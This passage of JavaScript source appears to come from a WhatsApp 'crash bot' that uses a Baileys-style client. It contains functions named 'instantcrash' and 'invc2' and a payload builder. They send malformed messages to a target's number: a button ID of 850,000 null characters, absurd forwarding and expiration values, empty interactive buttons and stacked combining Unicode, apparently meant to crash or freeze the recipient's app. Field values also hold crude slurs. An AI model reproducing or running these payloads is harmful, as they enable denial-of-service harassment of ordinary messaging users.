                  caption: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
                },
                contentText: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
                footerText: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/testi_hwuwhw99",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
              thumbnail: "",
              sourceUrl: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
              sourceId: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: ` 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰     - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await zephy.relayMessage(targetJid, messagePayload, {
    participant: { jid: targetJid},
  });
}

async function instantcrash(targetJid) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [targetJid],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: targetJid,
              },
            },
            body: {
              text: "𝐙𝐞𝐩𝐡𝐲𝐫𝐢𝐧⃕𝐞𝐇𝐢𝐲𝐚𝐬⃕𝐡𝐢╴͒ᝄ ",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await zephy.relayMessage(targetJid, message, {
      participant: { jid: targetJid },
    });
  } catch (err) {
    console.log(err);
  }
}

async function invc2(nomor) {
     let targetJid = nomor
     let msg = await generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: ""
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await zephy.relayMessage(targetJid, msg.message, {
                messageId: msg.key.id,
                participant: { jid: targetJid }
            });
        }
        
        

// ==================== START BOT ====================
startSesi();
console.log(chalk.green('[BOT] Bot aktif!'));

// Inisialisasi file premium
if (!fs.existsSync(PREMIUM_FILE)) {
  fs.writeFileSync(PREMIUM_FILE, JSON.stringify({ premiumUsers: [] }, null, 2));
}